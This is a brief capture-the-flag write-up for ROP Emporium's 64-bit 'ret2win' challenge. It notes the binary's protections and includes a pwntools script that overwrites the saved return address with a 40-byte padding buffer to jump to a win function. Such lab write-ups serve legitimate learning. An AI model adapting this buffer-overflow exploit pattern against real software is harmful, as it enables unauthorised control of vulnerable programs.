# ret2win-64bit
this challange is the very first one in the "ROP Emporium" series. 
it's a basic return pointer overwrite without any tricks.    
   
![Screenshot from 2020-04-02 11-19-39-edited](https://user-images.githubusercontent.com/60041914/78273124-14177280-7517-11ea-8fca-1f42421d4b38.png)

this binary has NX but no PIE or stack canary.   
inside the binary we can find a "ret2win" function.   
![Screenshot from 2020-04-02 11-22-04-edited](https://user-images.githubusercontent.com/60041914/78273542-a3bd2100-7517-11ea-8ac6-71b36de827de.png)

we can write a simple script using pwntools that overwrites the return pointer with that address.      
```python
from pwn import *

RET2WIN=0x00400811

r=process("./ret2win")
exploit=b"A"*40
exploit+=p64(RET2WIN)

r.sendline(exploit)
r.interactive()
```
![Screenshot from 2020-04-02 11-22-52-edited](https://user-images.githubusercontent.com/60041914/78273669-d49d5600-7517-11ea-8ccc-9184231a9303.png)
 
